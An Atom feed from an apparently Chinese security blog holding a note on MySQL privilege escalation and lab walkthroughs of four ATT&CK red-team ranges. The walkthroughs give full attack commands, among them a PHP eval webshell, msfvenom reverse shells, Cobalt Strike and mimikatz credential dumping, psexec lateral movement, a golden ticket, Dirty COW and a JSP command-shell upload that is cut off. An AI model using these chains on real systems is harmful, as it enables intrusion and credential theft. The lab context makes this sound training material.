<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>NoObject&#39;s blog</title>
  
  <subtitle>hacker</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-09-08T11:18:12.397Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>NoObject</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>mysql提权</title>
    <link href="http://yoursite.com/2020/09/07/mysql%E6%8F%90%E6%9D%83/"/>
    <id>http://yoursite.com/2020/09/07/mysql%E6%8F%90%E6%9D%83/</id>
    <published>2020-09-07T13:51:43.000Z</published>
    <updated>2020-09-08T11:18:12.397Z</updated>
    
    <content type="html"><![CDATA[<p>MySQL提权</p><p>1.UDF提权<br>udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。<br>2.MOF提权<br>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。MOF文件每五秒就会执行，而且是系统权限，通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;MySQL提权&lt;/p&gt;&lt;p&gt;1.UDF提权&lt;br&gt;udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的
      
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK红队评估实战靶场</title>
    <link href="http://yoursite.com/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/"/>
    <id>http://yoursite.com/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/</id>
    <published>2020-09-06T12:29:04.000Z</published>
    <updated>2020-09-15T06:42:10.532Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ATT-amp-CK红队评估实战靶场-一"><a href="#ATT-amp-CK红队评估实战靶场-一" class="headerlink" title="ATT&amp;CK红队评估实战靶场(一)"></a>ATT&amp;CK红队评估实战靶场(一)</h1><p>搭建好环境后,用nmap进行扫描</p><blockquote><p>nmap -sV -p- 192.168.189.129</p></blockquote><p>发现开启80，3306端口</p><p>访问192.168.189.129:80网页</p><a id="more"></a><p>是php探针</p><p>发现最下面是mysql检测</p><p>尝试默认密码</p><p>root/root</p><p>成功</p><p>用nikto扫描目录</p><blockquote><p>nikto -h 192.168.189.129</p></blockquote><p>发现扫描到</p><p>phpinfo.php</p><p>phpmyadmin</p><p>用root/root登录phpmyadmin</p><p>尝试用 into outfile 文件写入shell</p><p>需要以下条件</p><blockquote><p>1、对web目录需要有写权限能够使用单引号</p><p>select user();</p><p>2、知道绝对路径</p><p>3、没有配置-secure-file-priv（在mysql的配置文件中需要有一句 secure_file_priv=” ，没有的话自行添加或修改）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure></blockquote><p>发现secure_file_priv是null</p><p>不能导入导出文件</p><p>尝试利用日志getshell</p><blockquote><p>show global variables like ‘%general%’</p></blockquote><p>发现是off</p><p>设置为on</p><blockquote><p>set global general_log=’ON’</p></blockquote><p> 将日志文件的存放位置修改为当前网站的根目录： </p><blockquote><p>set global  general_log_file = ‘C:/phpStudy/WWW/shell.php’</p></blockquote><p>然后执行语句</p><blockquote><p>SELECT ‘<?php @eval($_POST["bypass"]); ?>‘</p></blockquote><p>查看靶机上是否写入成功</p><p>有shell.php文件</p><blockquote><p>200906 22:25:39      153 Connect    root@localhost on<br>     153 Query    SET NAMES ‘utf8’ COLLATE ‘utf8_general_ci’<br>     153 Query    SELECT ‘<?php @eval($_POST["bypass"]); ?>‘<br>     153 Quit    </p></blockquote><p>然后用蚁剑连接shell</p><blockquote><p><a href="http://192.168.189.129/shell.php" target="_blank" rel="noopener">http://192.168.189.129/shell.php</a></p></blockquote><p>查询下权限</p><blockquote><p>whoami</p><p>god\administrator</p><p> 当前是个域管理员的权限 </p></blockquote><p>再查询下其他信息</p><blockquote><p>ipconfig /all</p><p>两张网卡</p><p>IPv4 地址 . . . . . . . . . . . . : 192.168.52.2(首选) </p><p>IPv4 地址 . . . . . . . . . . . . : 192.168.189.129(首选)</p><p>systeminfo    </p><p>net config workstation 查看当前登录域 和用户登录信息</p><p>ping owa.god.org   得到域控的ip</p><p>192.168.52.3</p></blockquote><p>为了方便后续内网横向移动，利用webshell 反弹shell至MSF 和 cobaltstrike： </p><p>使用msfvenom生成payload文件</p><blockquote><p>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.189.128 LPORT=7777 -f raw &gt; test.php</p></blockquote><p>然后用蚁剑上传</p><p>然后用msf的handler模块监听</p><blockquote><p>use exploit/multi/handler</p><p>set payload php/meterpreter/reverse_tcp</p><p>set LHOST 192.168.189.128</p><p>set LPORT 7777</p><p>exploit</p></blockquote><p>远程访问文件</p><p>成功反弹shell</p><p>然后用 cobaltstrike 进行下一步操作</p><h2 id="部署TeamServer"><a href="#部署TeamServer" class="headerlink" title="部署TeamServer"></a>部署TeamServer</h2><blockquote><p>./teamserver &lt;你的ip&gt; &lt;密码&gt; </p></blockquote><h2 id="部署CobaltStrike"><a href="#部署CobaltStrike" class="headerlink" title="部署CobaltStrike"></a>部署CobaltStrike</h2><blockquote><p>./start.sh</p></blockquote><p>然后</p><blockquote><p>cobalt strike-&gt;listeners-&gt;add</p><p>填入服务器ip和空闲的监听端口</p><p>接着生成payload</p><p>attacks-&gt;packages-&gt;windows executable</p><p>用蚁剑上传</p><p>start &lt;payload名字&gt;</p></blockquote><p>得到shell</p><blockquote><p>user是administrator</p></blockquote><p>然后用 svc-exe 提权</p><blockquote><p>先右键interact得到beacon</p><p>右键access-&gt;elevate</p><p>elevate svc-exe test</p><p>得到system权限</p></blockquote><p>用hashdump看下密码</p><blockquote><p>hashdump</p></blockquote><p>用logonpasswords抓取明文密码</p><blockquote><p>logonpasswords</p></blockquote><p>抓到hongrisec@2020 密码</p><p>接下来进行psexec传递</p><p>有两种情况</p><h2 id="目标机出网"><a href="#目标机出网" class="headerlink" title="目标机出网"></a>目标机出网</h2><blockquote><p>获取凭据后，需要对目标网段进行端口存活探测，缩小范围。探测方式比较多，本文仅依托CobalStrike本身完成，不借助其他工具。因为是psexec传递登录，这里仅需探测445端口。（ psexec：在主机上使用服务派生会话 ）</p><p>使用portscan命令：ip网段 — ports端口 — 扫描协议（arp、icmp、none）— 线程（实战不要过高）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`beacon&gt; portscan 192.168.144.0/24 445 arp 200`</span><br></pre></td></tr></table></figure><p>view-&gt;targets</p><p>jump-&gt;psexec</p><p>选择之前获取到的凭据信息（明文密文均可），此处选择明文，并确定接收的Listener与主机的Session。 </p></blockquote><h2 id="目标机不出网"><a href="#目标机不出网" class="headerlink" title="目标机不出网"></a>目标机不出网</h2><blockquote><p>实战中往往还会遇到通过某种方式，获取到目标内网中某台主机的系统权限，但是该主机处在隔离网络中，不能出网。因为CobalStrike服务端是搭建在互联网中的，通过常规方式是无法上线的，这里就需要利用已上线的主机，将它做一个Listener，实现链路上线CobalStrike。 </p><p>选择已经上线的主机创建listener smb</p><p>spawn smb </p><p>选择 Attacks-&gt;Packages-&gt;Windows Executable(Stageless)，支持导出该类型Listener对应的可执行文件或dll等。 </p><p>选择刚建立的Listener名字 </p><p>右键主机explore-&gt;file browser</p><p>上传刚才生成的payload到当前已上线的目标机中，还需要上传另一个工具PsExec.exe。 </p><p>在Beacon中使用PsExec工具将payload上传到不出网的目标机中，自动执行，上线。 </p><p>beacon&gt;shell C:\phpStudy\WWW\PsExec.exe -accepteula \192.168.52.2,192.168.52.3 -u Administrator -p hongrisec@2019 -d -c C:\phpStudy\WWW\beacon.exe</p></blockquote><p>也可以view-&gt;targets-&gt;jump-&gt;psexec</p><p>监听smb</p><h1 id="ATT-amp-CK红队评估实战靶场-二"><a href="#ATT-amp-CK红队评估实战靶场-二" class="headerlink" title="ATT&amp;CK红队评估实战靶场(二)"></a>ATT&amp;CK红队评估实战靶场(二)</h1><p>环境搭建完毕，扫描网段存活主机</p><blockquote><p>nmap -sV 192.168.111.0/24</p></blockquote><p>发现有</p><blockquote><p>192.168.111.80   80 135 139 445 1433 3389 7001</p><p>192.168.111.201 135 139 445 3389</p></blockquote><p> 192.168.111.80尝试下7001端口，发现是weblogic服务 </p><p>使用WeblogicScan.py扫描下可能存在的漏洞</p><blockquote><p>python3 WeblogicScan.py -u 192.168.111.80 -p 7001</p><p>得到以下内容</p><p>[192.168.111.80:7001] Weblogic Version Is 10.3.6.0<br>[+] [192.168.111.80:7001] Weblogic console address is exposed! The path is: <a href="http://192.168.111.80:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener">http://192.168.111.80:7001/console/login/LoginForm.jsp</a><br>[+] [192.168.111.80:7001] Weblogic UDDI module is exposed! The path is: <a href="http://192.168.111.80:7001/uddiexplorer/" target="_blank" rel="noopener">http://192.168.111.80:7001/uddiexplorer/</a></p><p>[+] [192.168.111.80:7001] weblogic has a JAVA deserialization vulnerability:CVE-2019-2725</p></blockquote><p>可能存在cve-2019-2725</p><blockquote><p>用msf</p><p>search weblogic</p><p>use exploit/multi/misc/weblogic_deserialize_asyncresponseservice</p><p>设置option后</p><p>exploit</p><p>出现这个错误Exploit completed, but no session was created.</p><p>发现这个payload是针对unix环境的</p><p>show targets</p><p>set target 1</p><p>也可以使用 java 反序列化终极测试工具测试漏洞，工具地址：<a href="https://kfire.net/220.html" target="_blank" rel="noopener">https://kfire.net/220.html</a> </p></blockquote><p>成功getshell</p><p>然后</p><blockquote><p>shell</p><p>whoami</p><p>de1ay\administrator</p><p>然后查看开放端口</p><p>netstat -ano</p><p>查看网卡</p><p>ipconfig /all</p><p>得到dns服务器  10.10.10.10</p><p>beacon&gt;shell net config workstation   得到登录域信息</p><p>工作站域  de1ay.com</p><p>beacon&gt;net view    域内主机</p><p>pc 192.168.111.201</p><p>web 192.168.111.80</p><p>beacon&gt;shell net user /domain    域内用户</p><p>Administrator   krbtgt</p><p>beacon&gt;shell net group “domain controllers” /domain      查看域控制器名 </p><p>DC</p><p>beacon&gt;shell ping DC.de1ay.com     得到域控的ip</p><p>10.10.10.10</p></blockquote><p>然后把msf的shell派生到cs中</p><blockquote><p>background</p><p>use exploit/windows/local/payload_inject</p><p>set payload windows/meterpreter/reverse_http</p><p>set LhOST 192.168.111.128</p><p>set lport 8888</p><p>set session 1</p><p>set disablepayloadhandler true</p><p>run</p></blockquote><p>接着用mimikatz和hashdump抓取密码</p><blockquote><p>beacon&gt;logonpasswords</p><p>hashdump</p></blockquote><p>然后进行提权</p><p>用 svc-exe 提权</p><blockquote><p>先右键interact得到beacon</p><p>右键access-&gt;elevate</p><p>elevate svc-exe test</p><p>得到system权限</p></blockquote><p>信息收集完毕后</p><p>进行psexec传递</p><p>先创建smb</p><blockquote><p>可以右键session创建监听smb</p><p>beacon&gt;spawn smb </p><p>再进行psexec传递</p><p>监听smb</p></blockquote><p>成功拿下域控</p><h3 id="域控信息收集"><a href="#域控信息收集" class="headerlink" title="域控信息收集"></a>域控信息收集</h3><blockquote><p>hashdump</p></blockquote><p>在域控获得KRBTGT账户NTLM密码哈希</p><p>82dfc71b72a11ef37d663047bc2088fb</p><blockquote><p>logonpasswords</p></blockquote><p>得到SID</p><p>S-1-5-21-2756371121-2868759905-3853650604</p><h3 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h3><p>黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证。</p><p>黄金票据的条件要求：<br>1.域名称<br>2.域的SID值<br>3.域的KRBTGT账户NTLM密码哈希<br>4.伪造用户名</p><p>原理这篇 <a href="https://www.freesion.com/article/6833306427/" target="_blank" rel="noopener">https://www.freesion.com/article/6833306427/</a> 博客讲的很详细。</p><p>黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域控的 system 权限了，还可以使用黄金票据做权限维持，当域控权限掉后，在通过域内其他任意机器伪造票据重新获取最高权限。</p><p>WEB机 权限机器-&gt;右键-&gt;Access-&gt;Golden Ticket</p><p><img src="/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/%E5%AE%9E%E6%88%98%E4%BA%8C%E7%BB%93%E6%9E%9C.png" alt></p><h1 id="ATT-amp-CK红队评估实战靶场-三"><a href="#ATT-amp-CK红队评估实战靶场-三" class="headerlink" title="ATT&amp;CK红队评估实战靶场(三)"></a>ATT&amp;CK红队评估实战靶场(三)</h1><p>环境搭建完毕后,用nmap进行扫描</p><blockquote><p>nmap -sS -p- 192.168.1.1/24</p><p>192.168.1.110   开启22 80 3306 端口</p></blockquote><p>访问80端口，发现是用 Joomla搭建的网站</p><p>用joomscan进行扫描</p><blockquote><p>perl joomscan.pl -u <a href="http://192.168.1.110" target="_blank" rel="noopener">http://192.168.1.110</a></p></blockquote><p>发现登录页面<a href="http://192.168.1.110/administrator/" target="_blank" rel="noopener">http://192.168.1.110/administrator/</a></p><p>发现配置文件<a href="http://192.168.1.110/configuration.php" target="_blank" rel="noopener">http://192.168.1.110/configuration.php</a>~</p><p>在配置文件中发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public $dbtype = &apos;mysqli&apos;;</span><br><span class="line">public $host = &apos;localhost&apos;;</span><br><span class="line">public $user = &apos;testuser&apos;;</span><br><span class="line">public $password = &apos;cvcvgjASD!@&apos;;</span><br></pre></td></tr></table></figure><p>尝试连接mysql数据库</p><blockquote><p>mysql -h 192.168.1.110 -u testuser -P 3306 -p</p><p>cvcvgjASD!@</p></blockquote><p>连接成功</p><p> joomla默认后端编辑模板即可getshell</p><p>因为数据表中存储的管理员密码是加密的 </p><p> 根据 joomla 官方文档 <a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn" target="_blank" rel="noopener">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a> 执行 sql 语句在数据库中添加 admin2/secret 超级管理员，注意 sql 语句修改为目标数据表的前缀。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `am2zu_users`</span><br><span class="line">   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line">VALUES (&apos;Administrator2&apos;, &apos;admin2&apos;,</span><br><span class="line"> &apos;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&apos;, &apos;&apos;, NOW(), NOW(), NOW());</span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line">VALUES (LAST_INSERT_ID(),&apos;8&apos;);</span><br></pre></td></tr></table></figure><p>登录界面用admin2  secret登录成功</p><p> Extensions-&gt;Templates-&gt;Templates-&gt;Beez3 Details and Files-&gt;New File 新建文件 shell.php，写入一句话木马。 </p><p>蚁剑连接</p><p><a href="http://192.168.1.110/templates/beez3/test.php" target="_blank" rel="noopener">http://192.168.1.110/templates/beez3/test.php</a></p><p>尝试执行命令，返回ret=127，毫无疑问就是disable_functions的限制了 </p><p>通过phpinfo发现禁用了如下函数，目标是linux </p><p>没有禁用putenv函数 ,尝试利用LD_PRELOAD绕过 </p><p>用蚁剑把 bypass_diablefunc.php 和 bypass_diablefunc_x64.so 上传到目标的同一目录，注意 .so 文件需要根据目标系统架构选择，然后访问 bypass_diablefunc.php，cmd 是执行的命令，outpath是读写权限的目录，sopath是 .so 文件的绝对路径。</p><p>工具下载地址： <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><blockquote><p><a href="http://192.168.1.110/tmp/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/tmp/bypass_disablefunc_x64.so" target="_blank" rel="noopener">http://192.168.1.110/tmp/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/tmp/bypass_disablefunc_x64.so</a></p></blockquote><p>收集信息</p><blockquote><p>whoami     www-data </p><p>ifconfig       192.168.93.120  </p><p>cat /proc/version      </p><p>Linux version 4.4.0-142-generic (buildd@lgw01-amd64-033) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 </p></blockquote><p>在/tmp/mysql/test.txt中找到</p><blockquote><p>adduser wwwuser<br>passwd wwwuser_123Aqx</p></blockquote><p>尝试ssh连接</p><blockquote><p>ssh <a href="mailto:wwwuser@192.168.1.110" target="_blank" rel="noopener">wwwuser@192.168.1.110</a></p></blockquote><p>192.168.1.110不是我们getshell的主机，后端应该是nginx反代，我们目前得到的ubuntu的IP地址应该是192.168.93.120</p><blockquote><p>cat /proc/version<br>Linux version 2.6.32-431.el6.x86_64 (<a href="mailto:mockbuild@c6b8.bsys.dev.centos.org" target="_blank" rel="noopener">mockbuild@c6b8.bsys.dev.centos.org</a>) (gcc version 4.4.7 20120313 (Red Hat 4.4.7-4) (GCC) ) #1 SMP Fri Nov 22 03:15:09 UTC 2013</p></blockquote><p>版本在脏牛提权的范围内</p><blockquote><p>脏牛Linux本地提权漏洞复现(CVE-2016-5195)</p><h6 id="漏洞范围："><a href="#漏洞范围：" class="headerlink" title="漏洞范围："></a>漏洞范围：</h6><p>Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</p><h6 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h6><p>低权限用户利用该漏洞可以在众多Linux系统上实现本地提权</p><h6 id="简要分析："><a href="#简要分析：" class="headerlink" title="简要分析："></a>简要分析：</h6><p>该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。具体分析请查看官方分析。</p></blockquote><p>上传exp到centos中</p><p> <a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener">https://github.com/FireFart/dirtycow</a> </p><blockquote><p>scp /root/dirtycow-master/dirty.c <a href="mailto:wwwuser@192.168.1.129" target="_blank" rel="noopener">wwwuser@192.168.1.129</a>:dirty.c</p></blockquote><p> 使用<code>gcc -pthread dirty.c -o dirty -lcrypt</code>命令对dirty.c进行编译，生成一个dirty的可执行文件。 </p><blockquote><p>[wwwuser@localhost ~]$ ./dirty baji<br>File /tmp/passwd.bak already exists! Please delete it and run again</p></blockquote><blockquote><p>rm /tmp/passwd.bak</p></blockquote><blockquote><p>./dirty baji</p><p>Done! Check /etc/passwd to see if the new user was created.<br>You can log in with the username ‘firefart’ and the password ‘baji’.</p></blockquote><p>可以cat /etc/passwd查看是否成功</p><p> 切换 firefart/baji 用户，成功提权。 </p><blockquote><p>su fierfart</p></blockquote><p>scp /root/artifact.exe <a href="mailto:wwwuser@192.168.1.129" target="_blank" rel="noopener">wwwuser@192.168.1.129</a>:artifact.exe</p><p>用msf进行上线,先生成payload文件</p><blockquote><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=4444 -f elf &gt; shell.elf</p></blockquote><p>然后scp进行上传</p><blockquote><p>scp shell.elf <a href="mailto:wwwuser@192.168.1.129" target="_blank" rel="noopener">wwwuser@192.168.1.129</a>:shell.elf</p></blockquote><p>然后启动msf监听</p><blockquote><p>use exploit/multi/handler</p><p>set payload linux/x86/meterpreter/reverse_tcp</p><p>set lhost 192.168.1.128</p><p>set lport 4444</p><p>exploit</p></blockquote><p>进行内网探测</p><blockquote><p>run autoroute -s 192.168.93.0/24     在session下添加路由</p><p>background     meterpreter放在后台 </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.93.0/24</span><br><span class="line">background</span><br><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">set rhosts 192.168.93.0/24</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>因为同时开6台太卡了，以下全是其他大佬的流程</p><ul><li><p>192.168.93.10 windows 2012</p></li><li><p>192.168.93.20 windows 2008</p></li><li><p>192.168.93.30 windows 7</p><p>尝试爆破 windows 2008 的本地管理员 </p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line">set rhosts 192.168.93.20</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set PASS_FILE /usr/share/wordlists/top1000.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p> 123qwe!ASD </p><h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><p>在爆破密码成功的基础上，使用 msf 开个 socks4 正向代理，配合 proxychains。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvport 1080</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/proxychains.png" alt></p><p>wmi 出现在所有的 windows 操作系统中，由一组强大的工具集合组成，用于管理本地或远程的 windows 系统。攻击者使用 wmi 攻击时 windows 系统默认不会在日志中记录这些操作，可以做到无日志、攻击脚本无需写入到磁盘，增加了隐蔽性。</p><p>wmiexec 执行命令，搜集信息，wmiexec.py 下载地址 <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -debug &apos;administrator:123qwe!ASD@192.168.93.20&apos;</span><br></pre></td></tr></table></figure><p>也可以用psexec登陆win2008</p><blockquote><p>use exploit/windows/smb/psexec </p><p>set payload windows/meterpreter/bind_tcp</p><p> set rhost 192.168.93.20</p><p> set smbuser Administrator </p><p> set smbpass  123qwe!ASD </p><p>run</p></blockquote><p>ipconfig /all 知道 dns 服务器即域控是 192.168.93.10。那么基本的内网拓扑也清楚了，一台 centos 反向代理了一个 web，centos 有两个网卡，web 服务后端在 ubuntu 上，三台 windows 组成域环境，ip 分别是 192.168.93.10，192.168.93.20，192.168.93.30，域控为 windows server 2012，ip 为 192.168.93.10。</p><p>（反向代理服务器位于用户与目标服务器之间，但是对于用户而言，反向代理服务器就相当于目标服务器，即用户直接访问反向代理服务器就可以获得目标服务器的资源。反向代理的工作原理是，代理服务器来接受客户端的网络访问连接请求，然后服务器将请求有策略的转发给网络中实际工作的业务服务器，并将从业务服务器处理的结果，返回给网络上发起连接请求的客户端。更多解释 <a href="https://www.zhihu.com/question/36412304" target="_blank" rel="noopener">https://www.zhihu.com/question/36412304</a></p><p>反向代理优点：</p><ul><li>提高了内部服务器的安全</li><li>加快了对内部服务器的访问速度</li><li>节约了有限的IP资源</li></ul><p>）</p><p> tasklist /V 查看进程（显示对应用户），发现TEST域进程，可以尝试抓密码。 </p><p>kali 使用 smbclient 通过代理连接 windows server 2008 上传 mimikatz。下载地址 <a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/releases</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbclient //192.168.93.20/C$ -U administratorput mimikatz.exe</span><br></pre></td></tr></table></figure><p>wmiexec 远程执行 mimikatz 成功得到域管理员密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.log</span><br></pre></td></tr></table></figure><p>IPC$（Internet Process Connection）是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。利用IPC$连接者可以与目标主机建立一个连接，得到目标主机上的目录结构、用户列表等信息。</p><p>利用条件：</p><ol><li>管理员开启了默认共享</li><li>139或445端口开放</li></ol><p>ipc 远程连接读 flag.txt。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.93.10\admin$ zxcASDqw123!! /user:test\administrator   #系统默认路径c:\windows\下</span><br><span class="line">dir \\192.168.93.10\C$\users\administrator\Documents</span><br><span class="line">type \\192.168.93.10\C$\users\administrator\Documents\flag.txt</span><br></pre></td></tr></table></figure><h1 id="ATT-amp-CK红队评估实战靶场-四"><a href="#ATT-amp-CK红队评估实战靶场-四" class="headerlink" title="ATT&amp;CK红队评估实战靶场(四)"></a>ATT&amp;CK红队评估实战靶场(四)</h1><p>搭建环境后，docker要手动启动</p><p> 需要启动的环境分别为：s2-045、CVE-2017-12615、 cve-2018-12613 </p><p>ubuntu为我们的web环境，其中的web环境需要手动开启，全部为docker环境，启动方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>开始getshell</p><p>CVE-2017-12615 漏洞</p><p>这是一个关于任意文件上传的漏洞，在tomcat中启用put方法会导致任意文件可以上传，从而导致服务器权限被获取 </p><p>当web.xml中readonly设置为false时可以通过PUT/DELETE进行文件操控，漏洞就会触发。 </p><p><strong>漏洞危害：</strong>泄露用户代码数据，或用户服务器被攻击者控制。<br><strong>影响范围：</strong>Apache Tomcat 7.0.0 – 7.0.79 </p><p><a href="http://192.168.157.129:2002/" target="_blank" rel="noopener">http://192.168.157.129:2002/</a></p><p>抓包上传put</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /shell1.jsp/ HTTP/1.1</span><br><span class="line">Host: 192.168.157.129:2002</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Length: 660</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp</span><br><span class="line"></span><br><span class="line">+&quot;\\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return 